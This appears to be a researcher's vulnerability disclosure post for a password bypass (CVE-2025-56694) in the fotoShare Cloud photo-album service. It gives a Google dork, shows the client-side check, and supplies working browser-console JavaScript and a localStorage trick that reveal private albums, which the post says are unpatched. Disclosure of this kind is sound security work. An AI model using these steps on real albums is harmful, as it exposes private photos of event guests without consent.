---
title: "Password Bypass Vulnerability in fotoShare Cloud Events"
date: 2025-08-20 10:00:00 +0000
layout: post
---

# Vulnerability Summary
- **CVE ID:** [CVE-2025-56694](https://www.cve.org/CVERecord?id=CVE-2025-56694)  
- **Vendor:** LumaSoft  
- **Product:** fotoShare Cloud (public-facing SaaS photo album platform)  
- **Affected Component:** Password-protected photo albums  
- **Affected Versions:** All deployments up to at least 2025-08-20 (no patch available)  
- **Vulnerability Type:** Incorrect Access Control ([CWE-602: Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html))  
- **Impact:** Remote attackers can bypass client-side password protection to access private photo albums and images without authorization.  
- **Attack Vector:** Network  
- **Discoverer:** inf0sectom  

# What is fotoShare Cloud?

[fotoShare Cloud](https://fotoshare.co/) is a SaaS offering clients to instantly upload pictures taken from IRL photobooths to online photo albums that can be shared with event attendees via a URL. This URL is shared with attendees by email or SMS directly from the photobooth. 

[Passwords can be set on these photo albums](https://support.lumasoft.co/hc/en-us/articles/360046797573-Event-Privacy-and-Link-Sharing) by the owner of the photobooth, so that only guests with the password can view pictures from that event. For added privacy, photobooth owners can disable guest access so that guests cannot see other photos from the event. Typically, events only contain one album. Events, albums and images all have their own unique IDs.

# Finding the Vulnerability
## robots.txt
Events and photo albums are all available from the `/e/` and `/a/` subfolders, respectively. I was curious to see if these were indexed by Google, which led me to finding many albums simple Google dorks, such as `inurl:/e/ site:fotoshare.co`. I then checked fotoShare's `robots.txt` file, to confirm it was missing these subfolders:

```
C:\>curl https://fotoshare.co/robots.txt
User-agent: *
Disallow: /s/
Disallow: /u/
Disallow: /i/
```

Doing this led me to finding events and photo albums that were password-protected.

## Password-Protected Events

Hoping to find a vulnerability in the password protection mechanism, I inspected the JavaScript of a password-protected event and found the password verification function below:
```javascript
function verifyPassword(){
	var pwd = $("#albumPassword").val();
	$.ajax({
       url:'/album/validatepassword',
       type:'POST',
       data:{'password':pwd, 'album_id': '<album_id>' },
       dataType:'json',
       success:function(result){
       	 if(result.success){
       	    // would be expire in an year
            localStorage.setItem('album_<album_id>', 'true') ;
            
            $('#passwordModal').modal('hide') ;
   	 	 	 	        lazySizes.init();
       	 } else {
       	 	$('#notMatchedError').html('Incorrect Password');
       	 }
       }
    });
}
```

As you can see, this function takes the password entered by the user and submits it, along with the ID of the album, to the server through a POST request in AJAX.
The server returns `True` or `False` depending on whether the correct password for the album is entered. If the returned value is `False`, the page will display "Incorrect Password", but if the returned value is `True`, `if(result.success)` will execute the following:

```javascript
localStorage.setItem('album_<album_id>', 'true') ;// Locally store a value indicating the album as being visible 
$('#passwordModal').modal('hide') ;               // Hide the password prompt
lazySizes.init();                                 // Load the images via LazySizes
```

LazySizes is a JavaScript library used for lazy loading media content (such as images) on a webpage, to defer the loading of non-essential resources until they are needed. This is typically done to improve page load performance. In this case, it was wrongly used to prevent event images from being loaded by the client until the correct password is submitted by the client.

While the password verification is correctly done server-side, the actual mechanism to display the album was therefore done client-side, meaning there was nothing preventing an attacker from simply running the code contained within `if(result.success){}` directly from the browser console. This security weakness is referred to by MITRE as [CWE-602: Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html).

To confirm no authentication (such as a session token) was required to access images in password-protected events, I looked through the page's source code and successfully accessed the URLs contained in the `<img>` tags (such as the one below) in a private window. The URLs of password-protected images were referenced directly in the page's source code and available without an authentication mechanism.

```html
<img data-src="https://cdn-bz-op.fotoshare.co/<path_redacted>/<filename_redacted>.jpg?aspect_ratio=1:1.002&amp;width=450" class="lazyload border-radius-thumb" onerror="this.src='/img/blank-image.jpg'">
```

### Further Issues

The value stored locally by the first line contained within `if(result.success){}` (`localStorage.setItem('album_<album_id>', 'true') ;`) was being used in the JavaScript code below, when the page is loaded, so that clients wouldn't have to enter the password multiple times to see the album again. This meant that a malicious actor could also simply manually store the value and refresh the page to bypass the password-protection.

```javascript
var authenticated = JSON.parse(localStorage.getItem('album_<album_id>'));

if(true && authenticated !== true){
       $('#passwordModal').modal('show') ;
          $("#passwordModal").modal({
            keyboard: false,
         backdrop: 'static'
          });
          
          $('#albumPassword').focus();
          
          $('#albumPassword').on("keypress", function (e) {            
            if (e.keyCode == 13) {
             // Cancel the default action on keypress event
             e.preventDefault();
             verifyPassword(); 
               }
          });
          
          $('#passwordForm').on("submit", function (e) {            
              e.preventDefault();
             verifyPassword(); 
          });
    
} else {
             lazySizes.init();
}
```


# Exploiting the Vulnerability

A remote attacker could simply browse the web page of a password-protected event and run the JavaScript code below from the web browser's console to access private pictures:

```javascript
$('#passwordModal').modal('hide') ;               // Hide the password prompt
lazySizes.init();                                 // Load the images via LazySizes
```

A remote attacker could also parse the web page's source code to list the URLs of the private images, since these are directly referenced in an insecure manner.

As a result, private photo albums intended to be accessible only to event participants with a password can be viewed by anyone with the public album URL.

# Responsible Disclosure Timeline
- **2025-03-12**: Discovered the vulnerability.
- **2025-03-13**: Opened a support ticket with LumaSoft (parent company) and disclosed both the vulnerability and the privacy issue related to their `robots.txt` file, which was then forwarded by the support staff to their development team.
- **2025-04-02**: Confirmed the privacy issue related to the `robots.txt` file has been resolved.
- **2025-04-28**: After requesting for an update, LumaSoft support confirmed the development team is working on other updates.
- **2025-05-16**: After receiving no further updates, a 60-day deadline before public disclosure was provided to LumaSoft.
- **2025-06-17**: After receiving no further updates, a 30-day reminder was sent to LumaSoft.
- **2025-07-11**: A final reminder was sent to LumaSoft.
- **2025-07-18**: A CVE ID request was sent to MITRE.
- **2025-08-20**: [CVE-2025-56694](https://www.cve.org/CVERecord?id=CVE-2025-56694) was reserved by MITRE.


# Notes
*Text within angle brackets (`<>`) has been replaced throughout this write-up for privacy reasons.*